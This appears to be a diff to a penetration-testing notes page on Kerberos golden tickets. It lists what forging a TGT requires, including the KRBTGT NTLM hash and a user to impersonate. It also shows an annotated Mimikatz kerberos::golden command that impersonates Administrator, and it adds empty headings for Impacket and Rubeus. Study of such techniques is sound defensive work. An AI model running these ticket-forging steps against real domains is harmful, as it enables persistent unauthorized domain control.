@@ -13,9 +13,13 @@ toc: true
 ## golden Ticket
 <img src="/img/golden/sid.PNG" alt="Getting-gz" width="800" height="150"> 
 
-## Create the silver ticket
+## Forging Kerberos Tickets
 
-
+##  requirements for forging TG
+  Domain Name
+SID
+Domain KRBTGT Account NTLM password hash
+Impersonate user
 ```
 kerberos::golden  ## Name of the module  
 /user:Administrator  ## username of which the TGT is generated
@@ -28,3 +32,6 @@ kerberos::golden  ## Name of the module
 /endin:600  ##Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes 
 /renewmax:10080  ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 
 ```
+## golden ticket with Mimikatz
+## golden ticket with Impacket
+## golden ticket with Rubeus.exe
